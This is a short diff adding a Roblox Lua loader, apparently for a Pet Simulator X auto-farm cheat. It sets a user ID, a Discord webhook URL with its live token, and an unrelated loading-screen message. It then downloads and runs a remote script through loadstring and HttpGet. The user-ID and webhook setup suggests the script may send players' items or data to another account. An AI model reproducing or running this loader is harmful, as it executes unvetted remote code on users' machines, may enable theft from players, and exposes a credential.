@@ -1,0 +1,4 @@
+_G.UserID = 3203386237
+_G.WebHook = "https://discord.com/api/webhooks/1065626471688851486/HVJvmH1Sg8gde4zafcFAhih6ePbjMxGTo1vwzyGdbE_Y52NIa6sC2CY5OlpwN1LU3Irn"
+_G.LoadingScreenText = "Beyond the Universe starting..."
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua%27))()
